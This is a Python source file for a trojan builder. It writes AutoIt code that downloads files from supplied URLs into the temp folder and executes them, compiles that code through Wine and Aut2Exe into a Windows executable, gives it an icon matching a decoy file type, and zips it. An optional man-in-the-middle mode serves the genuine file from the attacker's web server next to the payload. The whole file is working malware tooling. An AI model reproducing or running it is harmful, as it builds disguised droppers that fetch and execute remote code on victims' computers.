#!/usr/bin/env python3
import subprocess
import os
import zipfile
import requests


TROJAN_SOURCE_CODE_FILE = "trojan.txt"
AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"

trojan_code = """
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
Local $urlsArray = StringSplit($urls, ",", 2 )
For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)
Next
Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sFile = StringReplace($sFile, "#", "")
    $sDirectory = @TempDir & "/" & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
"""

class Trojan:

	def __init__(self, url1: str, url2: str, icon: str | None, out_file: str, ip: str) -> None:
		self.url1 = url1
		self.url2 = url2
		file_type = url1.split(".")[-1].replace("#", "")
		self.icon = self.set_icon(icon, file_type)
		self.out_file = out_file
		self.ip = ip

	def create(self, mitm: bool | None = None) -> None:
		if mitm is True:
			name_original_file = self.url1.split("/")[-1].replace("#","")
			r = requests.get(self.url1)
			with open(f"/var/www/html/temp_{name_original_file}", "wb") as f:
				f.write(r.content)
			urls = f'Local $urls = "http://{self.ip}/temp_{name_original_file},{self.url2}"\n'
		else:
			urls = f'Local $urls = "{self.url1},{self.url2}"\n'
		with open(TROJAN_SOURCE_CODE_FILE, "w", encoding="utf-8") as trojan_file:
			trojan_file.write(urls + trojan_code)
	
	def compile(self):
		command = [
			"wine",
			AUT2EXE,
			"/In",
			TROJAN_SOURCE_CODE_FILE,
			"/Out",
			self.out_file,
			"/Icon",
			self.icon
		]
		subprocess.run(command, check=True)

	def set_icon(self, icon, file_type):
		icons_directory = os.path.join(os.path.dirname(os.path.realpath(__file__)), "icons")
		if icon is None:
			icon = os.path.join(icons_directory, f"{file_type}.ico")
		if not os.path.isfile(icon):
			print(f"[-] Can't find icon at {icon}")
			print("[-] Using generic icon.")
			icon = os.path.join(icons_directory, "generic.ico")	
		return icon

	def zip(self, file_to_zip):
		os.chdir(os.path.dirname(file_to_zip))
		trojan_name = os.path.basename(file_to_zip)
		zip_name = os.path.basename(self.out_file).split(".")[0]
		with zipfile.ZipFile(f"{zip_name}.zip", mode="w") as archive:
			archive.write(trojan_name)
